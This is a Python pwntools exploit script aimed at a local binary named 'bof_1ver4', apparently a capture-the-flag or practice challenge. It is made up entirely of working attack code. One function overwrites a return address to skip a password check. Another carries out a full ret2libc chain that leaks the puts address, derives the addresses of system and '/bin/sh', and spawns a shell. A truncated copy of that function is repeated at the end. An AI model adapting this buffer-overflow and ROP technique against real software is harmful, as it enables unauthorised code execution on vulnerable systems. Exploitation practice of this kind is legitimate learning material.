from pwn import*
def test():
	p=process("./bof_1ver4")
	raw_input("DEBUG")
	number="999\x00"
	payload=number
	p.send(payload)
	username="nonsudoer"
	payload=username+"\x00"+"\x00"*((40-len(username)-1))+p64(0x0000000000400aee)+"a"*(56-48)+username+"\x00"+"T"*(11-1)+"!@#$%^\x00"
	payload+="T"*(105-len(payload))

	p.send(payload)
	payload="!@#$%^"
	p.sendlineafter("Enter the Password:",payload)

	
	p.interactive()
# test()
	
def ret2libc():
	
	p=process("./bof_1ver4")
	raw_input("DEBUG")
	elf=ELF("./bof_1ver4")
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

	#lan 1
	payload="999"
	p.sendline(payload)
	
	payload="a".ljust(40,'a')
	payload+=p64(0x0000000000400bb3)
	payload+=p64(elf.symbols['got.puts'])
	payload+=p64(elf.symbols['plt.puts'])
	payload+=p64(elf.symbols['main'])

	p.sendline(payload)
	
	p.recvuntil("User is not exit\n")
	puts_libc=u64(p.recv(6)+'\x00'*2)
	print "recv: ",hex(puts_libc)

	base=puts_libc-libc.symbols['puts']
	system=base+libc.symbols['system']
	binsh=base+libc.search('/bin/sh').next()
	
	print 'system: ',hex(system)
	print "binsh: ",hex(binsh)
	
	# lan 2
	
	payload="999"
	p.sendlineafter("Enter the Account Number:",payload)
	payload="a".ljust(40,'a')
	payload+=p64(0x0000000000400bb3)
	payload+=p64(binsh)
	payload+=p64(0x0000000000400626)
	payload+=p64(system)
	
	
	p.sendline(payload)

	p.interactive()
ret2libc()




def ret2libc():
	
	p=process("./bof_1ver4")
	raw_input("DEBUG")
	elf=ELF("./bof_1ver4")
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

	#lan 1
	payload="999"
	p.sendline(payload)
	
	payload="a".ljust(40,'a')
	payload+=p64(0x0000000000400bb3)
	payload+=p64(elf.symbols['got.puts'])
	payload+=p64(elf.symbols['plt.puts'])
	payload+=p64(elf.symbols['main'])

	p.interactive()
# ret2libc()
